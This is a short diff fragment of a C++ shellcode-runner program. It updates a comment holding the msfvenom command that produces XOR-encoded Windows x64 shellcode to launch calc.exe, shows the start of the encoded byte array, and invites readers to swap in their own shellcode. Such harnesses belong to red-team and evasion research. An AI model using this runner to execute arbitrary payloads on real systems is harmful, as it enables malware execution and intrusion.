@@ -11,7 +11,7 @@ int main()
     using namespace ShellcodeExecution;
 
     // shellcode generated with msfvenom. Starts calc.exe
-    // msfvenom -p windows/x64/exec CMD=calc.exe -f c -e x64/xor
+    // msfvenom -p windows/x64/exec CMD="calc.exe" -f c -v shellcode -e x64/xor
     // You can replace it with your own shellcode
     unsigned char shellcode[] =
         "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
